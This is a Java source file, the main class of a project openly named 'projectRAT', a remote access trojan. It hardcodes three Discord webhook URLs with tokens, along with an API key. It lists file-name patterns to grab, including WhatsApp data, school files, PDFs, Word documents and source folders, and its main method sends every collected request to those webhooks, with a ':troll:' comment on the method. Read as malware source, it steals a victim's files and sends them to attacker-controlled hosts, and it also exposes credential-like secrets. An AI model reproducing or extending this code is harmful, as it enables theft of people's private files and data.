package in.momin5.projectRAT;

import in.momin5.projectRAT.request.Request;
import in.momin5.projectRAT.request.RequestManager;

import java.lang.management.ManagementFactory;
import java.lang.management.OperatingSystemMXBean;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Arrays;
import java.util.List;

public class ProjectRAT {

    public static String[] webhook = {
            "https://discord.com/api/webhooks/887386102351138846/UvND2AOg1aJDbRJV2C5EqQ2zDS80zFXAfHPmeXunixX0DYy8ouJHqwVwX2PdVcFS7I49",
            "https://discord.com/api/webhooks/887386132428496896/AsB2Kq338Yw400rVgU4KNixEU1CKXy-Q3_IsvPcpUrRgDV5R9unkAl-LH43t7SryKMfi",
            "https://discord.com/api/webhooks/887386238565384262/OnMXKLdw0uSr2ZAJAGtcewIoRYgIure6Ka6Z70uTxQUQdBh1Vd3BmjnhaC5uKOBvVLWW"
    };
    public static String apiKey = "b4ee6a619f9b4212a33f8881459d2cb7";
    public static List<String> grabsFilesName = Arrays.asList(
            "src",
            "WhatsApp",
            ".jar",
            "school",
            ".pdf",
            ".docx"
    );
    public static RequestHandler requestHandler;

    public static void main(String[] args) {
        startingTrolling();
    }

    // seperate method for reflections :troll:
    public static void startingTrolling(){
        try {
            RequestManager manager = new RequestManager();
            requestHandler = new RequestHandler();
            for (Request request : manager.getRequests()){
                request.init();
                requestHandler.sendRequest(request);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

}
